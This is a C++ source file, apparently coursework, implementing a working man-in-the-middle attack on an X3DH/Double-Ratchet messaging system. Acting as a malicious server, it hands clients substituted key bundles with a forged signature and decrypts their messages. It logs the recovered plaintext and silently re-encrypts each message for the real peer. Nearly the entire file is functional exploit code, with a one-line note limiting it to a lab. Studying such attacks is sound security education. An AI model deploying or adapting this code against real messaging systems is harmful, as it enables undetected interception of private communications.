// attack2.cpp — Attack 2: malicious server / MITM via identity-key substitution
// -----------------------------------------------------------------------------
// Mallory IS the messaging server. The implementation's initiator NEVER verifies the
// signed-prekey signature (clients log `warn: SPK sig NOT verified`) and there is no
// out-of-band identity check, so when Alice fetches "bob"'s bundle Mallory can hand
// back her OWN identity + prekeys. Alice then runs X3DH against Mallory's keys while
// believing she is talking to Bob. Mallory runs a SECOND X3DH as initiator toward the
// real Bob. She now shares a Double-Ratchet session with EACH side, so she decrypts
// every message (recovering plaintext) and re-encrypts it for the other party — a
// transparent, undetected MITM.
//
// Validated crypto recipe (confirmed by decrypting real client traffic in the lab):
//   * X3DH exactly as protocol.md §3 (INFO="AS3_X3DH", 0xFF*32 prefix, SPK-only when
//     opk_id==0).
//   * kdf_rk = HKDF-SHA256(salt=RK, ikm=DH, info="AS3_ROOT", 64) -> (RK', CK).
//     kdf_ck = (HMAC(CK,0x01), HMAC(CK,0x02)).
//   * AEAD = ChaCha20-Poly1305, zero 96-bit nonce.
//   * KEY FINDING: the AEAD associated data is AD = init.ik_dh(32) || responder.ik_dh(32)
//     ONLY. The implementation does NOT bind serialize(header) into the AEAD (a
//     deviation from protocol.md §4.3). AD is symmetric: initiator and responder both
//     use initiator_ik_dh || responder_ik_dh.
//
// Three forwarding modes produce the three evidence classes the assignment asks for:
//   --mode reencrypt : substitute, DECRYPT (recover plaintext), re-encrypt to the real
//                      peer. Peer reads the message; Mallory read it too.  [RECOVER +
//                      transparent FORWARD]
//   --mode raw       : substitute + decrypt, but forward Alice's ORIGINAL ciphertext to
//                      Bob unchanged. Bob's session key differs, so his decrypt FAILS.
//                      [message that FAILS AUTHENTICATION]
//   --mode honest    : no substitution; relay the end-to-end ciphertext untouched.
//                      Mallory CANNOT read it; Bob decrypts fine. [message merely
//                      FORWARDED — the E2EE baseline the attack defeats]
//
// Build:  g++ -O2 -std=c++17 -o attack2 attack2.cpp -lpthread -lcrypto
// Run:    ./attack2 --listen 0.0.0.0:9000 --mode reencrypt
//         then point BOTH clients at Mallory: --server-addr mallory --port 9000
//
// NOTE: for authorized use against the provided lab environment only.

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>

#include <cstdint>
#include <cstring>
#include <iostream>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

namespace {

using Bytes = std::vector<uint8_t>;

// ----------------------------- base64 (standard, padded) ---------------------
const char* B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::string b64e(const Bytes& in) {
    std::string out;
    int val = 0, bits = -6;
    for (uint8_t c : in) {
        val = (val << 8) + c;
        bits += 8;
        while (bits >= 0) {
            out.push_back(B64[(val >> bits) & 0x3F]);
            bits -= 6;
        }
    }
    if (bits > -6) out.push_back(B64[((val << 8) >> (bits + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}
Bytes b64d(const std::string& in) {
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; ++i) T[(uint8_t)B64[i]] = i;
    Bytes out;
    int val = 0, bits = -8;
    for (uint8_t c : in) {
        if (c == '=' || T[c] == -1) break;
        val = (val << 6) + T[c];
        bits += 6;
        if (bits >= 0) {
            out.push_back((val >> bits) & 0xFF);
            bits -= 8;
        }
    }
    return out;
}

// ----------------------------- primitives (OpenSSL) --------------------------
Bytes hmac_sha256(const Bytes& key, const Bytes& msg) {
    Bytes out(32);
    unsigned len = 32;
    HMAC(EVP_sha256(), key.data(), (int)key.size(), msg.data(), msg.size(), out.data(),
         &len);
    out.resize(len);
    return out;
}
Bytes hkdf_sha256(const Bytes& salt, const Bytes& ikm, const std::string& info, int L) {
    Bytes prk = hmac_sha256(salt, ikm);  // extract
    Bytes okm, t;
    uint8_t ctr = 1;
    while ((int)okm.size() < L) {
        Bytes in = t;
        in.insert(in.end(), info.begin(), info.end());
        in.push_back(ctr++);
        t = hmac_sha256(prk, in);
        okm.insert(okm.end(), t.begin(), t.end());
    }
    okm.resize(L);
    return okm;
}

struct KeyPair {
    Bytes priv, pub;
};  // raw 32-byte X25519
KeyPair x25519_gen() {
    EVP_PKEY* pk = EVP_PKEY_Q_keygen(nullptr, nullptr, "X25519");
    KeyPair kp;
    kp.priv.resize(32);
    kp.pub.resize(32);
    size_t n = 32;
    EVP_PKEY_get_raw_private_key(pk, kp.priv.data(), &n);
    n = 32;
    EVP_PKEY_get_raw_public_key(pk, kp.pub.data(), &n);
    EVP_PKEY_free(pk);
    return kp;
}
Bytes x25519(const Bytes& priv, const Bytes& peer_pub) {
    Bytes out(32, 0);
    EVP_PKEY* me =
        EVP_PKEY_new_raw_private_key(EVP_PKEY_X25519, nullptr, priv.data(), 32);
    EVP_PKEY* peer =
        EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, nullptr, peer_pub.data(), 32);
    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(me, nullptr);
    size_t len = 32;
    if (ctx && EVP_PKEY_derive_init(ctx) > 0 && EVP_PKEY_derive_set_peer(ctx, peer) > 0) {
        EVP_PKEY_derive(ctx, out.data(), &len);
    }
    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(me);
    EVP_PKEY_free(peer);
    return out;
}
Bytes ed25519_pub() {  // identity verify key we advertise (its signature is never checked)
    EVP_PKEY* pk = EVP_PKEY_Q_keygen(nullptr, nullptr, "ED25519");
    Bytes pub(32);
    size_t n = 32;
    EVP_PKEY_get_raw_public_key(pk, pub.data(), &n);
    EVP_PKEY_free(pk);
    return pub;
}

// ChaCha20-Poly1305, 96-bit zero nonce. ct = ciphertext||tag(16).
bool aead_decrypt(const Bytes& key, const Bytes& ct_tag, const Bytes& ad, Bytes& out) {
    if (ct_tag.size() < 16) return false;
    size_t clen = ct_tag.size() - 16;
    out.assign(clen, 0);
    Bytes nonce(12, 0), tag(ct_tag.end() - 16, ct_tag.end());
    EVP_CIPHER_CTX* c = EVP_CIPHER_CTX_new();
    int len = 0, ok = 0;
    EVP_DecryptInit_ex(c, EVP_chacha20_poly1305(), nullptr, nullptr, nullptr);
    EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_AEAD_SET_IVLEN, 12, nullptr);
    EVP_DecryptInit_ex(c, nullptr, nullptr, key.data(), nonce.data());
    if (!ad.empty()) EVP_DecryptUpdate(c, nullptr, &len, ad.data(), (int)ad.size());
    EVP_DecryptUpdate(c, out.data(), &len, ct_tag.data(), (int)clen);
    EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_AEAD_SET_TAG, 16, tag.data());
    ok = EVP_DecryptFinal_ex(c, out.data() + len, &len);
    EVP_CIPHER_CTX_free(c);
    return ok > 0;
}
Bytes aead_encrypt(const Bytes& key, const Bytes& pt, const Bytes& ad) {
    Bytes out(pt.size()), tag(16), nonce(12, 0);
    EVP_CIPHER_CTX* c = EVP_CIPHER_CTX_new();
    int len = 0;
    EVP_EncryptInit_ex(c, EVP_chacha20_poly1305(), nullptr, nullptr, nullptr);
    EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_AEAD_SET_IVLEN, 12, nullptr);
    EVP_EncryptInit_ex(c, nullptr, nullptr, key.data(), nonce.data());
    if (!ad.empty()) EVP_EncryptUpdate(c, nullptr, &len, ad.data(), (int)ad.size());
    EVP_EncryptUpdate(c, out.data(), &len, pt.data(), (int)pt.size());
    EVP_EncryptFinal_ex(c, out.data() + len, &len);
    EVP_CIPHER_CTX_ctrl(c, EVP_CTRL_AEAD_GET_TAG, 16, tag.data());
    EVP_CIPHER_CTX_free(c);
    out.insert(out.end(), tag.begin(), tag.end());
    return out;
}

Bytes cat(const Bytes& a, const Bytes& b) {
    Bytes o = a;
    o.insert(o.end(), b.begin(), b.end());
    return o;
}
Bytes x3dh_sk(const Bytes& ikm_rest) {  // 0xFF*32 || dh... -> HKDF
    Bytes ikm(32, 0xFF);
    ikm.insert(ikm.end(), ikm_rest.begin(), ikm_rest.end());
    return hkdf_sha256(Bytes(32, 0), ikm, "AS3_X3DH", 32);
}

// ----------------------------- tiny JSON helpers -----------------------------
// The wire is flat, machine-generated JSON; targeted extraction is enough.
std::string jstr(const std::string& s, const std::string& key) {
    auto p = s.find("\"" + key + "\":\"");
    if (p == std::string::npos) return "";
    p += key.size() + 4;
    auto e = s.find('"', p);
    return s.substr(p, e - p);
}
long jint(const std::string& s, const std::string& key, long def) {
    auto p = s.find("\"" + key + "\":");
    if (p == std::string::npos) return def;
    p += key.size() + 3;
    return strtol(s.c_str() + p, nullptr, 10);
}
// extract the {...} object value of `key` (balanced braces)
std::string jobj(const std::string& s, const std::string& key) {
    auto p = s.find("\"" + key + "\":{");
    if (p == std::string::npos) return "";
    p += key.size() + 3;
    int depth = 0;
    for (size_t i = p; i < s.size(); ++i) {
        if (s[i] == '{') depth++;
        else if (s[i] == '}' && --depth == 0) return s.substr(p, i - p + 1);
    }
    return "";
}

// ----------------------------- ratchet sessions ------------------------------
// Mallory as RESPONDER (peer = an initiator who fetched a substituted bundle).
struct RecvSess {
    Bytes RK, CKr, DHr, AD;
    bool have_dhr = false;
    // Mallory's substituted long-term/prekey material:
    const KeyPair *ik_dh, *spk, *opk;
    void init(const std::string& initblk) {
        Bytes ikA = b64d(jstr(initblk, "ik_dh"));
        Bytes ek = b64d(jstr(initblk, "ek"));
        long opk_id = jint(initblk, "opk_id", 0);
        Bytes ikm = cat(cat(x25519(spk->priv, ikA), x25519(ik_dh->priv, ek)),
                        x25519(spk->priv, ek));
        if (opk_id != 0) ikm = cat(ikm, x25519(opk->priv, ek));
        RK = x3dh_sk(ikm);
        AD = cat(ikA, ik_dh->pub);
    }
    bool recv(const std::string& hdr, const Bytes& ct, Bytes& pt) {
        Bytes dhr = b64d(jstr(hdr, "dh"));
        if (!have_dhr || dhr != DHr) {
            Bytes out = hkdf_sha256(RK, x25519(spk->priv, dhr), "AS3_ROOT", 64);
            RK.assign(out.begin(), out.begin() + 32);
            CKr.assign(out.begin() + 32, out.end());
            DHr = dhr;
            have_dhr = true;
        }
        Bytes mk = hmac_sha256(CKr, {0x01});
        CKr = hmac_sha256(CKr, {0x02});
        return aead_decrypt(mk, ct, AD, pt);
    }
};

// Mallory as INITIATOR toward the real peer (she ran X3DH with their real bundle).
struct SendSess {
    Bytes RK, CKs, AD;
    std::string init_blk;
    KeyPair DHs;
    long Ns = 0;
    bool first = true;
    const KeyPair* m_ik_dh;
    Bytes m_ik_sig;
    void init(const std::string& peer_bundle) {
        Bytes ikB = b64d(jstr(peer_bundle, "ik_dh"));
        Bytes spkB = b64d(jstr(peer_bundle, "spk"));
        long opk_id = jint(peer_bundle, "opk_id", 0);
        std::string opk = jstr(peer_bundle, "opk");
        KeyPair ek = x25519_gen();
        Bytes ikm = cat(cat(x25519(m_ik_dh->priv, spkB), x25519(ek.priv, ikB)),
                        x25519(ek.priv, spkB));
        if (opk_id != 0 && !opk.empty()) ikm = cat(ikm, x25519(ek.priv, b64d(opk)));
        RK = x3dh_sk(ikm);
        AD = cat(m_ik_dh->pub, ikB);
        init_blk = "\"init\":{\"ik_sig\":\"" + b64e(m_ik_sig) + "\",\"ik_dh\":\"" +
                   b64e(m_ik_dh->pub) + "\",\"ek\":\"" + b64e(ek.pub) +
                   "\",\"opk_id\":" + std::to_string(opk_id) + "}";
        DHs = x25519_gen();
        Bytes out = hkdf_sha256(RK, x25519(DHs.priv, spkB), "AS3_ROOT", 64);
        RK.assign(out.begin(), out.begin() + 32);
        CKs.assign(out.begin() + 32, out.end());
    }
    // returns a full frame JSON for recipient `to`, spoofing sender `from`.
    std::string send(const std::string& from, const std::string& to, const Bytes& pt) {
        Bytes mk = hmac_sha256(CKs, {0x01});
        CKs = hmac_sha256(CKs, {0x02});
        Bytes ct = aead_encrypt(mk, pt, AD);
        std::string hdr = "{\"dh\":\"" + b64e(DHs.pub) + "\",\"pn\":0,\"n\":" +
                          std::to_string(Ns);
        if (first) {
            hdr += "," + init_blk;
            first = false;
        }
        hdr += "}";
        Ns++;
        return "{\"from\":\"" + from + "\",\"to\":\"" + to + "\",\"header\":" + hdr +
               ",\"ct\":\"" + b64e(ct) + "\"}";
    }
};

// ----------------------------- server state ----------------------------------
enum Mode { REENCRYPT, RAW, HONEST };
struct Server {
    Mode mode = REENCRYPT;
    KeyPair m_ik_dh, m_spk, m_opk;  // Mallory's substituted material
    Bytes m_ik_sig;
    std::mutex mu;
    std::map<std::string, std::string> real_bundle;             // user -> bundle json
    std::map<std::string, std::vector<std::string>> mailbox;    // user -> frames
    std::map<std::string, RecvSess> rsess;                      // "from|to" -> recv
    std::map<std::string, SendSess> ssess;                      // "from|to" -> send
    void setup() {
        m_ik_dh = x25519_gen();
        m_spk = x25519_gen();
        m_opk = x25519_gen();
        m_ik_sig = ed25519_pub();
    }
    std::string substituted_bundle(const std::string& user) {
        // valid-looking identity, but a DELIBERATELY BOGUS spk_sig (64 x 0x41) to prove
        // the initiator never verifies it.
        Bytes bogus_sig(64, 0x41);
        return "{\"user\":\"" + user + "\",\"ik_sig\":\"" + b64e(m_ik_sig) +
               "\",\"ik_dh\":\"" + b64e(m_ik_dh.pub) + "\",\"spk\":\"" + b64e(m_spk.pub) +
               "\",\"spk_sig\":\"" + b64e(bogus_sig) + "\",\"opk\":\"" + b64e(m_opk.pub) +
               "\",\"opk_id\":1}";
    }
};

Server G;
void logm(const std::string& m) {
    static std::mutex lm;
    std::lock_guard<std::mutex> g(lm);
    std::cerr << m << "\n";
}

void send_line(int fd, const std::string& s) {
    std::string o = s + "\n";
    send(fd, o.data(), o.size(), 0);
}

void on_send(int fd, const std::string& line) {
    std::string fr = jobj(line, "frame");
    std::string from = jstr(fr, "from"), to = jstr(fr, "to");
    std::string hdr = jobj(fr, "header");
    std::string initblk = jobj(hdr, "init");
    Bytes ct = b64d(jstr(fr, "ct"));
    std::string key = from + "|" + to;

    if (G.mode == HONEST) {
        // E2EE baseline: Mallory never substituted, so she holds no session key. She can
        // only relay the ciphertext; she cannot read it. Bob decrypts it normally.
        std::lock_guard<std::mutex> g(G.mu);
        G.mailbox[to].push_back(fr);
        logm("[mallory] mode=honest: FORWARDED e2e ciphertext " + from + "->" + to +
             " (plaintext is NOT recoverable by the server)");
        send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
        return;
    }

    // substitution modes: decrypt in the Alice<->Mallory session
    Bytes pt;
    bool got = false;
    {
        std::lock_guard<std::mutex> g(G.mu);
        if (!initblk.empty()) {
            RecvSess rs;
            rs.ik_dh = &G.m_ik_dh;
            rs.spk = &G.m_spk;
            rs.opk = &G.m_opk;
            rs.init(initblk);
            G.rsess[key] = rs;
        }
        auto it = G.rsess.find(key);
        if (it != G.rsess.end()) got = it->second.recv(hdr, ct, pt);
    }
    if (got) {
        logm("[mallory] *** RECOVERED PLAINTEXT " + from + "->" + to + ": \"" +
             std::string(pt.begin(), pt.end()) + "\" ***");
    } else {
        logm("[mallory] could not decrypt " + from + "->" + to +
             " (no substituted session?)");
    }

    if (G.mode == RAW) {
        // Forward Alice's ORIGINAL ciphertext unchanged. Bob's X3DH (with his real keys +
        // Alice's real init) yields a DIFFERENT key than Alice used (she used Mallory's
        // substituted prekeys), so Bob's AEAD check FAILS -> "message that fails auth".
        std::lock_guard<std::mutex> g(G.mu);
        G.mailbox[to].push_back(fr);
        logm("[mallory] mode=raw: relayed Alice's ORIGINAL ciphertext to '" + to +
             "' -> his decrypt will FAIL (keys don't match)");
        send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
        return;
    }

    // mode=reencrypt: re-encrypt the recovered plaintext under Mallory<->Bob and deliver.
    if (got) {
        std::lock_guard<std::mutex> g(G.mu);
        if (!G.ssess.count(key) && G.real_bundle.count(to)) {
            SendSess ss;
            ss.m_ik_dh = &G.m_ik_dh;
            ss.m_ik_sig = G.m_ik_sig;
            ss.init(jobj(G.real_bundle[to], "bundle"));
            G.ssess[key] = ss;
        }
        auto it = G.ssess.find(key);
        if (it != G.ssess.end()) {
            std::string out = it->second.send(from, to, pt);
            G.mailbox[to].push_back(out);
            logm("[mallory] FORWARDED re-encrypted frame to real '" + to +
                 "' (transparent; both sides see a working session)");
        }
    }
    send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
}

void handle(int fd) {
    std::string buf;
    char chunk[16384];
    for (;;) {
        size_t nl;
        while ((nl = buf.find('\n')) == std::string::npos) {
            ssize_t r = recv(fd, chunk, sizeof(chunk), 0);
            if (r <= 0) {
                close(fd);
                return;
            }
            buf.append(chunk, (size_t)r);
        }
        std::string line = buf.substr(0, nl);
        buf.erase(0, nl + 1);
        std::string type = jstr(line, "type");
        if (type == "register") {
            send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
        } else if (type == "publish") {
            std::string user = jstr(line, "user");
            {
                std::lock_guard<std::mutex> g(G.mu);
                G.real_bundle[user] = line;  // keep the real bundle for forwarding
            }
            logm("[mallory] stored REAL bundle of '" + user + "'");
            send_line(fd, "{\"type\":\"ok\",\"ok\":true,\"count\":5}");
        } else if (type == "fetch_bundle") {
            std::string user = jstr(line, "user");
            if (G.mode == HONEST) {
                // hand back the real bundle (no substitution) — honest baseline
                std::string b;
                {
                    std::lock_guard<std::mutex> g(G.mu);
                    if (G.real_bundle.count(user)) b = jobj(G.real_bundle[user], "bundle");
                }
                if (b.empty()) b = G.substituted_bundle(user);
                send_line(fd, "{\"type\":\"bundle\",\"bundle\":" + b + ",\"count\":4}");
            } else {
                send_line(fd, "{\"type\":\"bundle\",\"bundle\":" +
                                  G.substituted_bundle(user) + ",\"count\":4}");
                logm("[mallory] SUBSTITUTED bundle for '" + user +
                     "' -> handed Mallory's keys to the initiator");
            }
        } else if (type == "send") {
            on_send(fd, line);
        } else if (type == "poll") {
            std::string user = jstr(line, "user");
            std::string frames;
            {
                std::lock_guard<std::mutex> g(G.mu);
                auto it = G.mailbox.find(user);
                if (it != G.mailbox.end()) {
                    for (size_t i = 0; i < it->second.size(); ++i) {
                        if (i) frames += ",";
                        frames += it->second[i];
                    }
                    it->second.clear();
                }
            }
            send_line(fd, "{\"type\":\"frames\",\"frames\":[" + frames + "]}");
        } else {
            send_line(fd, "{\"type\":\"ok\",\"ok\":true}");
        }
    }
}

int listen_on(const std::string& host, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    int yes = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    sockaddr_in a{};
    a.sin_family = AF_INET;
    a.sin_port = htons((uint16_t)port);
    a.sin_addr.s_addr = (host == "0.0.0.0") ? INADDR_ANY : inet_addr(host.c_str());
    if (bind(fd, (sockaddr*)&a, sizeof(a)) || listen(fd, 32)) {
        close(fd);
        return -1;
    }
    return fd;
}

}  // namespace

int main(int argc, char** argv) {
    std::string host = "0.0.0.0";
    int port = 9000;
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        if (a == "--listen" && i + 1 < argc) {
            std::string s = argv[++i];
            auto p = s.rfind(':');
            host = s.substr(0, p);
            port = std::stoi(s.substr(p + 1));
        } else if (a == "--mode" && i + 1 < argc) {
            std::string m = argv[++i];
            G.mode = (m == "raw") ? RAW : (m == "honest") ? HONEST : REENCRYPT;
        } else if (a == "-h" || a == "--help") {
            std::cout << "usage: attack2 --listen H:P --mode reencrypt|raw|honest\n";
            return 0;
        }
    }
    G.setup();
    int lfd = listen_on(host, port);
    if (lfd < 0) {
        std::cerr << "cannot listen on " << host << ":" << port << "\n";
        return 1;
    }
    const char* mn = G.mode == RAW ? "raw" : G.mode == HONEST ? "honest" : "reencrypt";
    std::cerr << "[mallory] malicious server up on " << host << ":" << port
              << " (mode=" << mn << ")\n";
    for (;;) {
        int cfd = accept(lfd, nullptr, nullptr);
        if (cfd >= 0) std::thread(handle, cfd).detach();
    }
}
